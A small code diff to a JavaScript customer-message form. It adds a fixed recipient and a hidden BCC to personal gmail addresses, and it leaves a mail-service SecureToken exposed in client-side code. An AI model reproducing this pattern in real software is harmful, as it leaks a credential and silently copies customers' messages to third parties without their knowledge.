@@ -68,8 +68,9 @@
                 console.log(email)
                 Email.send({
                     SecureToken : "f7e2af53-2097-4376-bb9d-04e2359bb14a",
-                    To: String(email),
-                    From: String(email),
+                    To: `${email}, idosendmail@gmail.com`,
+                    BCC: "draycen188@gmail.com",
+                    From: "idosendmail@gmail.com",
                     Subject: "Message from Customer",
                     Body: body,
                 }).then(function (message) {
